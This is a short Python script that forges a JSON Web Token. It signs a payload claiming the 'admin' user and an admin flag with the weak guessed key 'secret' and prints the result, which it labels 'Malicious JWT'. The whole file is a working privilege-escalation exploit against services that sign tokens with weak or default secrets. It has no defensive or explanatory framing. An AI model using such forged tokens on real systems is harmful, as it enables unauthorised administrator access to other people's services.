import jwt


SECRET_KEY = "secret"  
payload = {"username": "admin", "admin": True}  


malicious_token = jwt.encode(payload, SECRET_KEY, algorithm='HS256')

print("Malicious JWT:", malicious_token)

